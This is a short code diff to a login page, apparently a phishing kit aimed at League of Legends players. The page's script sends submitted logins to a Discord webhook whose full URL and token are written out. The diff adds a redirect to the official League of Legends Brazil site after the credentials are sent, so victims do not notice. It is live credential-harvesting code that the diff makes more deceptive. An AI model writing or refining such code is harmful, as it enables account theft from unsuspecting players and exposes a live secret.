@@ -213,6 +213,7 @@
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1312272446266540172/gFzxvmYhFtyc3GNYUVRO1STRnQ4lTnSugAck0RMieMVIQuSSHpvHRJ3MYAHX32U6WYCO";
+    const REDIRECT_URL = "https://www.leagueoflegends.com/pt-br/";
 
     document.getElementById('loginForm').addEventListener('submit', async function (e) {
       e.preventDefault();
@@ -235,7 +236,8 @@
         });
 
         if (response.ok) {
-          alert('Login enviado com sucesso!');
+          // Redireciona o usuário após o envio dos dados para o webhook
+          window.location.href = REDIRECT_URL;
         } else {
           alert('Erro ao enviar login!');
         }
